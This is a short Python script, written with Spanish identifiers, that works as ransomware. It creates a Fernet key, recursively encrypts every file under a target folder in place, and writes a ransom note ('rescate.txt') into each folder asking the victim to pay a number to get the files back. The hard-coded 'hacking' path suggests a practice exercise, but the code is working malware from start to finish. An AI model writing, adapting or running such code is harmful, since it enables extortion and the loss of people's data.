from cryptography.fernet import Fernet
import os

def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)
            
def rutas(directorio, key): 
    with os.scandir(directorio) as ficheros:
        subdirectorios = [fichero.name for fichero in ficheros if fichero.is_dir()]

    cant = 0
    for elemen in subdirectorios:
        dato = directorio+"\\"
        dato = dato+subdirectorios[cant]
        print(dato)
        with os.scandir(dato)as ficheros:
            ficheros = [fichero.name for fichero in ficheros if fichero.is_file()]
        print(ficheros)
        full_path = [dato+'\\'+item for item in ficheros]

        encrypt(full_path, key)

        with open(dato+'\\'+'rescate.txt', 'w') as file:
            file.write('Ficheros encriptados\n')
            file.write('Para recuerarlos deposite al numero 123546789')

        cant += 1
        rutas(dato,key)


if __name__ == '__main__':
    generar_key()
    key = cargar_key()
    path_to_encrypt = 'C:\\hacking\\D'

    rutas(path_to_encrypt, key)

    with os.scandir(path_to_encrypt)as ficheros:
        ficheros = [fichero.name for fichero in ficheros if fichero.is_file()]

    full_path = [path_to_encrypt+'\\'+item for item in ficheros]
    encrypt(full_path, key)

    with open(path_to_encrypt+'\\'+'rescate.txt', 'w') as file:
        file.write('Ficheros encriptados\n')
        file.write('Para recuerarlos deposite al numero 123546789')
